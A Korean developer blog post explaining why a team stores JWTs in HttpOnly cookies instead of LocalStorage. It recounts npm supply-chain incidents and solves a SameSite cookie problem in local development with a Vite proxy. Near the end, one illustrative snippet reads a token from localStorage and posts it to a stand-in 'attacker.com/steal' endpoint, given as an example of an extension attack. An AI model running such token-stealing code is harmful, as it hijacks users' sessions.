---
title: 'JWT 토큰을 Cookie에서 관리하는 이유'
description: JWT 저장 방식의 역사(LocalStorage → HttpOnly Cookie)를 분석하고, SameSite 쿠키 정책으로 로컬 개발이 막힌 문제를 Vite 프록시로 해결한 과정을 정리한다.
date: 2025-11-06T00:00:00.000Z
tags:
  - JWT
  - Cookie
  - HttpOnly
  - SameSite
  - XSS
  - Vite Proxy
category: team/Joying
draft: false
coverImage: "/uploads/project/Joying/jwt-cookie-security/spa.svg"
series: "Joying"
---

# 로컬에선 401, 운영에선 200... 같은 API인데 왜? SameSite 쿠키 때문에 막혔던 이야기

## 배경

**서비스**: 물품 대여 플랫폼 (Spring Boot API + React SPA). 회원가입/로그인 → JWT 발급 → 이후 모든 API에 인증 필요.

**프론트엔드 구조**: React(Vite) SPA로, 로컬 개발 시 `localhost:5173`에서 실행. 운영 시 `api.joying.com`과 `joying.com`으로 같은 도메인.

## 들어가며

프로젝트 시작하면서 가장 먼저 마주한 질문.

"JWT 토큰 어디에 저장할까?"

팀원 중 한 명이 "그냥 LocalStorage에 넣으면 되는 거 아니야?"라고 했습니다.
나도 처음엔 그렇게 생각했습니다. 간단하고 쉬우니까.

근데 찾아보니까 큰일날 뻔했습니다.

---

## JWT 저장 방식의 역사: 왜 다들 쿠키로 넘어갔을까?

### 초창기 (2012-2015): Authorization 헤더 전성시대

**그때는 왜 헤더를 썼을까?**

#### 1. RESTful API 철학이 유행


**"상태가 없는(Stateless)"** API가 트렌드
GET /api/users
Authorization: Bearer eyJhbGc...

- REST 원칙: 서버는 상태 저장하지 않음
- 토큰은 클라이언트가 관리
- 깔끔하고 명확한 구조

#### 2. SPA(Single Page Application) 등장

AngularJS, Backbone.js 시대
"클라이언트가 모든 걸 관리하자!" 분위기
![](/uploads/project/Joying/jwt-cookie-security/spa.svg)


- 프론트엔드가 강력해짐
- 서버는 API만 제공
- 클라이언트가 상태 관리

#### 3. 모바일 앱과 웹 API 통일

![](/uploads/project/Joying/jwt-cookie-security/mobile.svg)


- 웹/앱 API 엔드포인트 동일
- 쿠키는 브라우저만 가능
- 헤더는 모든 클라이언트 지원

#### 4. CORS 문제 회피

![](/uploads/project/Joying/jwt-cookie-security/cors.svg)


**이 시기 대표 서비스:**
- Firebase Authentication
- Auth0
- 초기 Spotify API
- GitHub API

당시엔 이게 정석이었다고 합니다.

> 출처: [OWASP - Token Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html), [Auth0 Documentation - Token Storage](https://auth0.com/docs/secure/security-guidance/data-security/token-storage)

---

### 전환기 (2016-2018): XSS 공격의 시대

#### 대형 보안 사고들이 터지기 시작

**2017년 2월 - Cloudflare Cloudbleed 사고**
- 2016년 9월 22일부터 HTML 파서 버그로 메모리 덤프 발생
- Cloudflare를 사용하는 수백만 웹사이트 영향
- 비밀번호, 세션 쿠키, 인증 토큰 등 민감한 데이터 유출
- 검색엔진에 캐싱되어 노출

> 출처: [Rapid7 - Cloudflare Cloudbleed Vulnerability Explained](https://www.rapid7.com/blog/post/2017/02/24/cloudflare-data-leakage-or-dare-i-saycloudbleed/)

**2017 - Equifax 해킹**
- 1억 4천만 명 개인정보 유출
- Apache Struts 프레임워크의 원격 코드 실행(RCE) 취약점(CVE-2017-5638)이 원인
- XSS 공격은 아니지만, 웹 애플리케이션 보안의 중요성을 각인시킨 사건

> 출처: [Wikipedia - 2017 Equifax Data Breach](https://en.wikipedia.org/wiki/2017_Equifax_data_breach)

**2018 - British Airways 공격**
- 38만 명 결제 정보 유출
- JavaScript 주입 공격

> 출처: [BBC News - British Airways Data Breach](https://www.bbc.com/news/business-45368072)

#### 개발자들의 각성

![](/uploads/project/Joying/jwt-cookie-security/awakening.svg)


보안 전문가들이 경고하기 시작:
- OWASP Top 10에 XSS 계속 등장
- npm 패키지 공급망 공격 증가
- "토큰은 JavaScript에서 격리하라"

> 출처: [OWASP - XSS (Cross Site Scripting)](https://owasp.org/www-community/attacks/xss/), [SK쉴더스 - XSS 공격 유형부터 보안대책까지](https://www.skshieldus.com/blog-security/security-trend-idx-06), [민트민 개발 블로그 - 웹사이트 보안 공격 XSS 직접 사용해 보기](https://www.mintmin.dev/blog/2401/20240119)

---

### 현재 (2019-현재): HttpOnly Cookie가 표준

#### npm 공급망 공격의 증가

**2021년 10월 - ua-parser-js 침해 사고**
- 주간 700만+ 다운로드 인기 패키지 침해
- 공격자가 개발자 npm 계정 탈취
- 악성 버전(0.7.29, 0.8.0, 1.0.0) 배포
- Monero 채굴기 설치 + Windows 크리덴셜 탈취
- 약 4시간 동안 지속

> 출처: [CISA - Malware Discovered in ua-parser-js](https://www.cisa.gov/news-events/alerts/2021/10/22/malware-discovered-popular-npm-package-ua-parser-js), [Rapid7 - ua-parser-js Hijacked](https://www.rapid7.com/blog/post/2021/10/25/npm-library-ua-parser-js-hijacked-what-you-need-to-know/)

**2022년 1월 - colors.js & faker.js 사태**
- 개발자가 의도적으로 무한루프 코드 삽입
- npm 생태계 신뢰도 문제 제기
- 수많은 프로젝트 빌드 중단

> 출처: [yceffort 기술블로그 - colors.js와 faker.js 사태가 준 교훈](https://yceffort.kr/2022/01/npm-colors-fakerjs)

**2022년 2월 - Discord 토큰 탈취 공격**
- npm에서 17개 악성 패키지 발견
- Discord 토큰 수집 기능 포함
- 3억 명 Discord 사용자 타겟

> 출처: [보안뉴스 - 디스코드 서버 하이재킹하는 악성 패키지](https://m.boannews.com/html/detail.html?idx=103228), [The Hacker News - 25 Malicious npm Packages](https://thehackernews.com/2022/02/25-malicious-javascript-libraries.html)

#### 보안 커뮤니티의 합의

**OWASP 권고사항**
> "웹 애플리케이션에서 인증 토큰은 HttpOnly, Secure, SameSite 쿠키에 저장하라"

> 출처: [OWASP - Token Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html), [OWASP - HTML5 Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html)

**Chrome 80 변경 (2020년 2월)**
> SameSite 쿠키 기본값이 None에서 Lax로 변경되어 보안 강화

> 출처: [Google Developers - Get Ready for New SameSite=None; Secure Cookie Settings](https://developers.google.com/search/blog/2020/01/get-ready-for-new-samesitenone-secure), [web.dev - SameSite cookies explained](https://web.dev/i18n/ko/samesite-cookies-explained/)

---

### 왜 쿠키로 넘어갔나? 정리

| 시기 | 주류 방식 | 이유 |
|------|----------|------|
| **2012-2015** | Authorization 헤더 | RESTful 유행, SPA 등장, 모바일 통일 |
| **2016-2018** | 전환기 | 대형 XSS 공격 증가, 보안 경각심 |
| **2019-현재** | HttpOnly Cookie | OWASP 권고, 대기업 표준화 |

#### 결정적 이유 3가지

1. **실제 피해 사례 폭증**
    - 2022년 npm 25개 패키지 공격
    - 2021년 ua-parser-js (주간 700만 다운로드)
    - 실제 금전 피해 발생

2. **보안 커뮤니티 합의**
    - OWASP Top 10
    - Google, Microsoft 보안 팀 권고
    - 보안 강사들이 LocalStorage 강력 경고

3. **브라우저 보안 기능 강화**
    - SameSite 쿠키 (2020년 Chrome 기본값 변경)
    - Secure Context (HTTPS 강제)
    - HttpOnly 플래그 표준화

---

## JWT 저장 방식 4가지 완전 비교

### 방법 1) LocalStorage + Authorization 헤더

초창기 SPA 시대의 정석.

![](/uploads/project/Joying/jwt-cookie-security/localstorage.svg)


솔직히 처음엔 이게 제일 간단해 보였습니다. 구현도 쉽고, CORS 설정만 해주면 되고, 모바일 앱이랑 같은 방식이니까 통일성도 있습니다. RESTful API 철학에도 딱 맞아떨어집니다.

근데 문제는 보안입니다. JavaScript로 접근 가능하다는 게 생각보다 훨씬 위험했습니다. 악성 스크립트가 실행되면 토큰이 그대로 탈취됩니다. 브라우저가 제공하는 보안 기능도 전혀 활용할 수 없고, 토큰 만료나 갱신 로직도 200줄 넘게 직접 짜야 합니다.

#### 실제 사고 사례

**2022년 2월 - Discord 토큰 탈취 npm 패키지 25개 발견**

npm 패키지에 악성 코드가 포함되어 localStorage의 Discord 토큰을 탈취했습니다.
- colors.js, discord.js 등 유명 패키지 위장
- iframe을 통해 localStorage 접근
- 수백만 개발자 영향

출처: [The Hacker News - 25 Malicious JavaScript Libraries](https://thehackernews.com/2022/02/25-malicious-javascript-libraries.html)

![](/uploads/project/Joying/jwt-cookie-security/image.svg)


단 3줄로 토큰 탈취 끝.

> 출처: [velog - JWT의 안전한 저장소](https://velog.io/@kmlee95/JWT의-안전한-저장소), [민동준 Medium - XSS 공격을 직접 해보면서 알아보기](https://dj-min43.medium.com/xss-공격을-직접-해보면서-알아보기-c2c1d9baf7ec), [falsy.me - 웹 취약점 공격 방법인 XSS, CSRF에 대하여](https://falsy.me/웹-취약점-공격-방법인-xss-csrf에-대하여-간단하게-알아보/)

---

### 방법 2) 일반 Cookie + Authorization 헤더

쿠키에 저장하되, HttpOnly 없이.

![](/uploads/project/Joying/jwt-cookie-security/plain-cookie.svg)


쿠키의 만료 시간 자동 관리나 Domain, Path 제한 같은 기능은 쓸 수 있어서 LocalStorage보단 낫다고 볼 수 있습니다.

하지만 핵심 문제는 그대로입니다. `document.cookie`로 접근 가능하면 XSS 공격에 그대로 노출됩니다. LocalStorage랑 보안 수준이 똑같습니다. 게다가 쿠키는 자동 전송이 안 되니까 매번 헤더에 직접 넣어줘야 합니다. 쿠키의 진짜 장점을 활용도 못 하는 셈입니다.

LocalStorage의 단점 + Cookie의 복잡함 = 최악의 조합

---

### 방법 3) HttpOnly Cookie (자동 전송)

백엔드에서 HttpOnly 쿠키 설정, 브라우저가 자동으로 쿠키 전송.

![](/uploads/project/Joying/jwt-cookie-security/httponly-cookie.svg)

![](/uploads/project/Joying/jwt-cookie-security/httponly-cookie-2.svg)


이게 진짜입니다. JavaScript에서 `document.cookie`로 접근하려고 해도 빈 문자열만 반환됩니다. XSS 공격이 완전히 막힙니다. 브라우저가 알아서 쿠키를 전송해주고, SameSite로 CSRF 방어도 되고, 만료 시간도 자동으로 관리됩니다. 프론트엔드 코드는 10줄이면 끝납니다.

국내외 대형 서비스들이 이 방식을 표준으로 쓰고 있습니다.

다만 로컬 개발할 때 SameSite 정책 때문에 문제가 생깁니다(뒤에서 설명). CORS 설정도 credentials 옵션을 켜야 하고, 쿠키 용량도 4KB 제한이 있습니다. 서버 간 통신에는 적합하지 않습니다.

---

### 방법 4) HttpOnly Cookie + Authorization 헤더 변환

쿠키에 HttpOnly로 저장하되, 백엔드에서 헤더로 변환.

![](/uploads/project/Joying/jwt-cookie-security/httponly-cookie-3.svg)


HttpOnly의 보안과 Authorization 헤더의 유연성을 둘 다 가져가려는 방식입니다. 마이크로서비스 간 토큰 전달이 쉽고, API Gateway와도 호환성이 좋습니다. 레거시 시스템 통합할 때도 편합니다.

다만 구현이 복잡합니다. 쿠키와 헤더를 둘 다 관리해야 하고, 디버깅할 때도 헷갈립니다. 웬만하면 오버엔지니어링입니다.

마이크로서비스 아키텍처에서 가끔 쓰긴 하는데, 우리 프로젝트처럼 단일 서버 구조면 필요 없습니다.

---

## 각 방법의 실전 코드량 비교

### LocalStorage 방식 (200+ 줄)

![](/uploads/project/Joying/jwt-cookie-security/localstorage.png)


### HttpOnly Cookie 방식 (10줄)

![](/uploads/project/Joying/jwt-cookie-security/httponly-cookie-4.svg)


**20배 코드량 차이.**

---

## 우리가 HttpOnly Cookie를 선택한 이유

### 1. 보안이 최우선

XSS 공격 하나면 게임 끝입니다.
- 2022년 npm 패키지 공격: 수백만 개발자 영향
- 2021년 ua-parser-js 침해: 주간 700만 다운로드 패키지

HttpOnly는 JavaScript 접근 자체가 불가능합니다.

### 2. 코드가 간결합니다

200줄 vs 10줄. 버그 발생 가능성도 20배 차이.

### 3. 대기업들이 다 써요

#### 네이버
```
Cookie: NID_AUT (인증), NID_SES (세션)
NID_AUT: HttpOnly 설정됨 ✓
```

네이버는 NID_AUT 쿠키에 HttpOnly 속성을 설정해서 JavaScript 접근을 차단합니다. 로그인 프로세스에서 NID_AUT, NID_JKL, NID_SES 쿠키가 생성되며, 이 중 민감한 인증 정보를 담는 NID_AUT만 HttpOnly로 보호합니다.

> 출처: [SMJ Blog - 쿠키, 세션](https://smjeon.dev/etc/cookie-session/), [Minystory - requests로 네이버 스마트스토어센터 로그인 구현하기](https://minyeamer.github.io/blog/smartstore-login-3/)

#### 구글
```
Cookie: SID, HSID, SSID
HSID: HttpOnly 설정됨 ✓
유효기간: 2년
```

구글은 HSID 쿠키를 HTTPOnly로 설정해서 스크립트나 사용자가 수정할 수 없게 합니다. SID와 HSID는 사용자의 Google 계정 ID와 로그인 시간을 암호화해서 저장하며, 이를 통해 폼 제출 공격을 차단합니다.

> 출처: [Stack Overflow - SID and HSID cookies](https://stackoverflow.com/questions/39205434/sid-and-hsid-cookies-what-are-they-uses), [Evgenii Studitskikh - Understanding Google's Cookies](https://evgeniistuditskikh.com/code/understanding-googles-cookies-the-hidden-passport-behind-every-login/)

#### GitHub
```
Cookie: user_session
__Host prefix 사용 ✓
HttpOnly, Secure 설정됨 ✓
```

GitHub은 user_session 쿠키에 `__Host` prefix를 사용해서 쿠키 토싱(Cookie Tossing) 공격을 방어합니다. HttpOnly와 Secure 플래그를 함께 설정해서 JavaScript 접근 차단과 HTTPS 전송만 허용합니다.

> 출처: [GitHub Blog - Yummy cookies across domains](https://github.blog/engineering/infrastructure/yummy-cookies-across-domains/), [Codegram - Secure GitHub OAuth with cookies](https://www.codegram.com/blog/secure-github-oauth-with-cookies/)

현업 표준입니다.

> 추가 출처: [GDSC UOS - JWT HTTPS Cookie 사용한 보안 로그인](https://gdsc-university-of-seoul.github.io/Login-by-JWT-HTTPS-COOKIE/), [OWASP - LocalStorage vs Cookies Best Practices](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html)

---

## 그런데 문제가 생겼다

백엔드 구현 끝내고 운영 서버에 배포했습니다. 완벽하게 작동했습니다.

근데 로컬에서 개발하려고 하니까...

### 이상한 현상

```javascript
// AuthContext.jsx
const response = await axiosInstance.get('/api/v1/auth/me');
// → 401 Unauthorized
```

카카오 로그인도 성공했고, 개발자 도구에서 쿠키도 보이는데 401이 떴습니다.

```
localhost:5173 → https://------.-.-------.io/api/v1/auth/me
→ 401 (쿠키 전송 안 됨)

https://------.-.-------.io → https://------.-.-------.io/api/v1/auth/me
→ 200 (쿠키 전송됨)
```

**같은 API인데 호출하는 도메인에 따라 결과가 다르다?**

---

## 범인은 SameSite 쿠키 정책

Chrome DevTools로 확인해봤습니다.

### Application 탭

```
Name: accessToken
Value: eyJhbGc...
Domain: ------.-.-------.io
SameSite: Lax  ← 이게 문제
```

### Network 탭

```
Request Headers:
  Cookie: (비어있음)  ← 쿠키 안 보내짐
```

쿠키는 있는데 요청할 때 안 보내져요.

### SameSite란?

CSRF 공격 막으려고 브라우저가 쿠키 전송을 제한하는 정책.

| SameSite | 언제 쿠키 전송? |
|----------|---------------|
| **Strict** | 무조건 같은 도메인만 |
| **Lax** | 같은 도메인 + 안전한 GET 요청 |
| **None** | 크로스 사이트도 허용 (Secure 필수) |

우리는 `SameSite=Lax`로 설정했습니다.

```java
cookie.setAttribute("SameSite", "Lax");
```

### 왜 로컬에서 안 될까?

```
localhost:5173 → https://------.-.-------.io
```

이건 **크로스 사이트**:
- 프로토콜: `http://` ≠ `https://`
- 도메인: `localhost` ≠ `------.-.-------.io`
- 포트: `5173` ≠ `443`

→ `SameSite=Lax` 쿠키 전송 안 됨!

```
https://------.-.-------.io → https://------.-.-------.io
```

이건 **퍼스트 파티**:
- 모든 조건 동일

→ 쿠키 정상 전송!

> 출처: [web.dev - SameSite cookies explained](https://web.dev/i18n/ko/samesite-cookies-explained/), [HAHWUL - Cookie and SameSite](https://www.hahwul.com/2020/01/18/samesite-lax/), [Microsoft Learn - SameSite 쿠키 변경 처리](https://learn.microsoft.com/ko-kr/azure/active-directory/develop/howto-handle-samesite-cookie-changes-chrome-browser)

---

## 해결 방법 4가지 비교

### 해결 1) SameSite=None으로 변경

```java
cookie.setAttribute("SameSite", "None");
cookie.setSecure(true);
```

프론트 코드 안 고치고 백엔드만 한 줄 바꾸면 끝이니까 제일 쉬워 보입니다.

근데 생각해보면 이건 운영 환경 보안을 낮추는 것입니다. 로컬 개발 편의 때문에 실제 사용자 보안을 희생하는 건 말이 안 됩니다. CSRF 공격 위험도 증가합니다.

HttpOnly 선택한 이유가 보안인데, 이건 본말전도입니다. 선택 안 함.

---

### 해결 2) 로컬도 HTTPS

```bash
mkcert localhost
# https://localhost:5173
```

운영 환경이랑 똑같이 만들자는 아이디어입니다.

근데 프로토콜만 맞춰도 의미가 없습니다. 도메인이 다르면 (`localhost` ≠ `------.-.-------.io`) 여전히 크로스 사이트입니다. 인증서도 매번 관리해야 하고, 팀원 전부 설정해야 합니다.

HTTPS로 바꿔도 결국 차단됩니다. 선택 안 함.

---

### 해결 3) LocalStorage로 회귀

```javascript
localStorage.setItem('accessToken', token);
```

SameSite는 무관하니까 해결은 되겠지.

근데 이러면 XSS 취약점이 부활합니다. 200줄 코드 다시 작성해야 하고, OAuth2 전부 수정해야 하고, HttpOnly 선택한 이유를 포기하는 것입니다.

절대 안 함. 원점 회귀.

---

### 해결 4) Vite 프록시

```
브라우저 → localhost:5173/api
            ↓
       Vite가 대신 요청
            ↓
       https://------.-.-------.io/api
```

브라우저는 `localhost:5173`으로 요청 → 퍼스트 파티!

백엔드 코드는 전혀 안 건드립니다. 보안 설정도 그대로 유지됩니다. 프론트만 수정하면 끝입니다. 개발 서버에서만 작동하고 운영은 Nginx가 처리하는 구조라, 환경 분리도 깔끔합니다.

> 출처: [Vite - Server Proxy 공식 문서](https://vitejs.dev/config/server-options.html#server-proxy), [velog - Vite 프록시 설정](https://velog.io/@seowj0710/Cookie-SameSite-%EC%84%A4%EC%A0%95%ED%95%98%EA%B8%B0)

---

## Vite 프록시 구현

### 1. 환경 변수

`.env.development`
```properties
VITE_API_BASE_URL=/api/v1
VITE_BACKEND_TARGET=https://------.-.-------.io
```

팀원마다 다르게 설정 가능:
- 운영 백엔드: `https://------.-.-------.io`
- 로컬 백엔드: `http://localhost:8080`

### 2. Vite 설정

`vite.config.js`
![](/uploads/project/Joying/jwt-cookie-security/vite.svg)


### 3. Axios 설정

`axiosInstance.js`
![](/uploads/project/Joying/jwt-cookie-security/3-axios.svg)

10줄 끝.

---

## API 경로 중복 문제

개발 서버 실행했더니:

```
Request URL: http://localhost:5173/api/v1/api/v1/auth/me
```

`/api/v1` 두 번!

### 원인

```javascript
baseURL: '/api/v1'
axiosInstance.get('/api/v1/auth/me')  // 중복

// 결과: /api/v1 + /api/v1/auth/me = /api/v1/api/v1/auth/me
```

### 해결

```javascript
axiosInstance.get('/auth/me')  // 상대 경로만

// 결과: /api/v1 + /auth/me = /api/v1/auth/me
```

baseURL에 버전, 요청은 리소스만.

---

## 결과

### 개발 환경

```
1. 브라우저: localhost:5173/api/v1/auth/me
2. Vite: https://------.-.-------.io/api/v1/auth/me 대신 요청
3. 백엔드: Set-Cookie: accessToken=...; HttpOnly; SameSite=Lax
4. 브라우저: localhost:5173 쿠키로 저장
5. 다음 요청: 자동 전송!
```

### Network 탭

```
Request URL: http://localhost:5173/api/v1/auth/me
Cookie: accessToken=eyJhbGc...

Status: 200 OK
```

200 떴다!

### 운영 환경

```
https://------.-.-------.io (프론트)
    ↓ Nginx
https://------.-.-------.io/api/v1 (백엔드)
```

퍼스트 파티라 쿠키 정상 전송!

---

## 그래도 Authorization 헤더가 필요한 경우

웹에서는 HttpOnly Cookie가 최선이지만, 이런 경우는 헤더가 적합합니다.

### 1. 모바일 네이티브 앱

![](/uploads/project/Joying/jwt-cookie-security/mobile-2.svg)


**왜?**
- XSS 공격 없음 (웹뷰 아닌 이상)
- OS 레벨 암호화 저장소
- 쿠키보다 관리 쉬움
- 네이티브 앱에 쿠키 개념 없음

### 2. 서버 간 통신

```bash
# 마이크로서비스끼리
curl -H "Authorization: Bearer ${TOKEN}" https://internal-api.com
```

**왜?**
- 브라우저 아님
- 쿠키 개념 없음
- API 키 관리와 동일
- 명확한 인증 흐름

### 3. 마이크로서비스 아키텍처

![](/uploads/project/Joying/jwt-cookie-security/microservice.svg)


**왜?**
- 서비스 간 토큰 전달 명확
- API Gateway와 호환
- 쿠키는 서비스 간 전달 복잡

### 4. 공개 API / OAuth2 Provider

```javascript
// GitHub API
fetch('https://api.github.com/user', {
  headers: { Authorization: `Bearer ${githubToken}` }
});
```

**왜?**
- 외부 클라이언트 다양 (웹/앱/CLI)
- 쿠키로 통일 불가능
- RESTful API 표준
- 개발자 도구 (Postman, curl) 호환

### 5. CLI 도구

```bash
# GitHub CLI
gh api /user -H "Authorization: Bearer $TOKEN"
```

**왜?**
- 터미널에 쿠키 개념 없음
- 설정 파일에 토큰 저장
- 간단하고 명확

---

## 현실적인 선택: 하이브리드

대부분의 현대 서비스는 상황에 따라 다르게 사용합니다.

| 클라이언트 | 저장 방식 | 전송 방식 |
|:---:|:---:|:---:|
| 웹 브라우저 | HttpOnly Cookie | 자동 전송 |
| 모바일 앱 | Secure Storage | Auth 헤더 |
| 서버↔서버 | 환경 변수 | Auth 헤더 |
| CLI 도구 | 설정 파일 | Auth 헤더 |

### 실제 사례

**GitHub**
- **웹 로그인**: `user_session` 쿠키 (HttpOnly, Secure, `__Host` prefix)
- **Personal Access Token**: Authorization 헤더 (`ghp_*` 토큰)
- **GitHub CLI**: OAuth Token (헤더)
- **GitHub Actions**: `GITHUB_TOKEN` 환경 변수 (헤더)

GitHub은 웹 브라우저 인증에 HttpOnly 쿠키를 사용하지만, API나 CLI 도구에서는 Authorization 헤더를 사용합니다.

> 출처: [GitHub Blog - Yummy cookies across domains](https://github.blog/engineering/infrastructure/yummy-cookies-across-domains/)

**Google**
- **Gmail 웹**: SID, HSID, SSID 쿠키 (HSID는 HttpOnly)
- **Google Cloud API**: Service Account Key (JSON 파일, Authorization 헤더)
- **Firebase**: 공식적으로 HttpOnly Session Cookie 지원
- **gcloud CLI**: Application Default Credentials (헤더)

구글은 Gmail 같은 웹 서비스에서 HttpOnly 쿠키를 사용하지만, Cloud API나 CLI에서는 헤더 기반 인증을 사용합니다.

> 출처: [Firebase - Manage Session Cookies](https://firebase.google.com/docs/auth/admin/manage-cookies), [Stack Overflow - SID and HSID cookies](https://stackoverflow.com/questions/39205434/sid-and-hsid-cookies-what-are-they-uses)

**AWS**
- **AWS Console**: 세션 쿠키 사용 (브라우저)
- **API Gateway**: HttpOnly Cookie 권장 (공식 보안 블로그)
- **AWS CLI**: Access Key + Secret Key (헤더)
- **SDK**: Credentials file (`~/.aws/credentials`)
- **EC2/Lambda**: IAM Role (임시 토큰, 헤더)

AWS는 Console 웹 인터페이스에서 쿠키를 사용하지만, CLI와 SDK는 모두 헤더 기반 인증을 사용합니다. AWS Security Blog에서 API Gateway에 HttpOnly Cookie 인증 구현을 공식 권장합니다.

> 출처: [AWS Security Blog - HttpOnly Cookie Authentication in API Gateway](https://aws.amazon.com/blogs/security/reduce-risk-by-implementing-httponly-cookie-authentication-in-amazon-api-gateway/)

---

## 종합 비교표

### JWT 저장 방식 비교

| 방식 | XSS 방어 | 코드량 | 로컬 개발 | 추천도 |
|------|---------|--------|----------|--------|
| LocalStorage + 헤더 | 취약 | 200줄 | O | 1 (웹), 3 (앱) |
| Cookie + 헤더 | 취약 | 150줄 | O | 1 |
| HttpOnly Cookie | 강력 | 10줄 | 프록시 이용 | 5 (웹) |
| HttpOnly + 헤더 변환 | 강력 | 50줄 | 프록시 이용 | 3 (MSA) |

### SameSite 문제 해결 방법 비교

| 방법 | 백엔드 수정 | 보안 유지 | 복잡도 | 추천도 |
|------|-----------|---------|--------|--------|
| SameSite=None | 필요 | 약화 | 낮음 | 1 |
| HTTPS 인증서 | 불필요 | 유지 | 중간 | 2 |
| LocalStorage 회귀 | 필요 | 포기 | 높음 | x |
| Vite 프록시 | 불필요 | 유지 | 낮음 | 5 |

---

## 우리의 최종 선택

### 웹: HttpOnly Cookie

```java
// 백엔드
cookie.setHttpOnly(true);
cookie.setSecure(true);
cookie.setAttribute("SameSite", "Lax");
```

```javascript
// 프론트
const api = axios.create({
  baseURL: '/api/v1',
  withCredentials: true
});
```

### 로컬 개발: Vite 프록시

```javascript
// vite.config.js
proxy: {
  '/api': {
    target: 'https://-----.-.-----.io',
    changeOrigin: true,
  }
}
```

---

## 정리

### 역사로 보는 JWT 저장 방식

![](/uploads/project/Joying/jwt-cookie-security/history.png)


### 핵심 포인트

1. **HttpOnly Cookie는 XSS를 원천 차단**
2. **SameSite는 크로스 사이트 요청 제한**
3. **Vite 프록시로 개발 환경도 퍼스트 파티**
4. **네이버, 카카오, 쿠팡 등 대형 서비스들도 전부 이 방식**
5. **모바일/서버는 Authorization 헤더 적합**

---

## (2025년 11월 9일 댓글을 보고 수정했습니다.) 근데 단순하게... XSS 공격만 막으면 되는 거 아닌가?

여기까지 읽고 나면 이런 생각이 들 수 있습니다.

**"그냥 XSS 공격을 완벽하게 막으면 HttpOnly Cookie 안 써도 되는 거 아니야?"**

맞는 말입니다. XSS만 막으면 LocalStorage도 안전하긴 합니다.

근데 현실적으로 XSS를 완벽하게 막는 건 거의 불가능합니다.

### XSS를 완전히 막을 수 없는 이유

#### 1. 제어할 수 없는 의존성

우리 프로젝트에서 쓰는 npm 패키지 개수를 세어보면:

```bash
npm list --all | wc -l
# 보통 500~2000개
```

이 모든 패키지를 완벽하게 검증할 수 있을까요? **불가능합니다.**

실제 사례를 보면:

**2021년 10월 - ua-parser-js 침해**
- 주간 700만 다운로드 패키지
- 공격자가 개발자 npm 계정 탈취
- 악성 버전 배포 (4시간 동안)
- 토큰 탈취 코드 포함

우리가 아무리 코드를 잘 짜도, 신뢰했던 라이브러리가 악성 코드를 실행하면 끝입니다.

> 출처: [CISA - Malware Discovered in ua-parser-js](https://www.cisa.gov/news-events/alerts/2021/10/22/malware-discovered-popular-npm-package-ua-parser-js), [Rapid7 - ua-parser-js Hijacked](https://www.rapid7.com/blog/post/2021/10/25/npm-library-ua-parser-js-hijacked-what-you-need-to-know/)

**2022년 2월 - Discord 토큰 탈취**
- npm에서 25개 악성 패키지 발견
- 유명 패키지 위장 (colors.js, discord.js 등)
- localStorage의 토큰 자동 수집

> 출처: [The Hacker News - 25 Malicious npm Packages](https://thehackernews.com/2022/02/25-malicious-javascript-libraries.html), [보안뉴스 - 디스코드 서버 하이재킹하는 악성 패키지](https://m.boannews.com/html/detail.html?idx=103228)

#### 2. 브라우저 확장 프로그램

사용자가 설치한 Chrome/Firefox 확장 프로그램도 페이지의 JavaScript에 접근할 수 있습니다.

```javascript
// 악성 확장 프로그램이 실행하는 코드
const token = localStorage.getItem('accessToken');
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: token
});
```

이것도 서비스 개발자가 통제할 수 없는 영역입니다.

실제로 2018년 British Airways 공격도 서드파티 스크립트가 침해당한 사례였습니다.

> 출처: [BBC News - British Airways Data Breach](https://www.bbc.com/news/business-45368072)

#### 3. XSS 방어 자체가 완벽할 수 없다

아무리 조심해도:

- CSP (Content Security Policy) 설정 실수
- 새로 발견되는 브라우저 취약점 (0-day)
- 서드파티 스크립트 (Google Analytics, 광고 SDK 등)의 취약점
- React/Vue 같은 프레임워크의 버그

실제로 OWASP Top 10에서 XSS가 계속 상위권에 있는 이유가, 완벽하게 방어하기가 거의 불가능하기 때문입니다.

> 출처: [OWASP - XSS (Cross Site Scripting)](https://owasp.org/www-community/attacks/xss/), [SK쉴더스 - XSS 공격 유형부터 보안대책까지](https://www.skshieldus.com/blog-security/security-trend-idx-06)

### HttpOnly는 "만약의 경우"를 대비한 방어층

보안의 핵심 원칙은 Defense in Depth(다층 방어)입니다.

```
1차 방어: XSS 공격 자체를 막는다 (CSP, 입력 검증, escape 등)
2차 방어: XSS가 뚫려도 토큰을 못 훔치게 한다 ← HttpOnly Cookie
3차 방어: 토큰이 탈취되어도 피해를 최소화 (짧은 만료시간, IP 검증 등)
```

HttpOnly Cookie는 2차 방어선입니다.

LocalStorage에 저장하면:
- XSS 공격 성공 → 토큰 즉시 탈취 → 게임 오버

HttpOnly Cookie에 저장하면:
- XSS 공격 성공 → JavaScript로 토큰 접근 불가 → **추가 방어 시간 확보**

> 출처: [Microsoft Security - Defense in Depth](https://learn.microsoft.com/en-us/azure/well-architected/security/design-principles#defense-in-depth), [OWASP - Defense in Depth](https://owasp.org/www-community/Defense_in_Depth)

### 실제 대기업들의 선택

네이버, 카카오, 쿠팡, 토스 같은 회사들도 당연히 XSS 방어를 합니다.

근데 그와 동시에 HttpOnly Cookie도 씁니다.

왜? XSS 방어만으로는 충분하지 않다는 걸 알기 때문입니다.

보안팀이 아무리 잘해도:
- 신입 개발자가 실수할 수 있다
- 서드파티 라이브러리가 침해당할 수 있다
- 새로운 취약점이 발견될 수 있다

그래서 XSS 방어 + HttpOnly Cookie를 둘 다 합니다.

비용도 거의 없습니다. 백엔드 설정 3줄, 프론트 설정 2줄이면 끝입니다.

### 결론: 둘 다 필요하다

"XSS만 막으면 된다"는 이론적으로는 맞지만 현실적으로 불가능합니다.

실무에서는:

1. **XSS 공격을 최대한 막는다** (CSP, 입력 검증, escape 등)
2. 동시에 HttpOnly Cookie로 토큰을 격리합니다
3. 만료 시간, IP 검증 등 추가 방어층도 구축합니다

보안은 한 가지 방어에 기대지 않고 여러 겹의 방어막을 쌓는 일입니다.

HttpOnly는 그 중 하나의 중요한 층이고, 비용 대비 효과가 가장 큰 방어 수단 중 하나입니다.

그래서 OWASP, Google, Microsoft 같은 곳에서 모두 "HttpOnly Cookie에 저장하라"고 권고하는 겁니다.

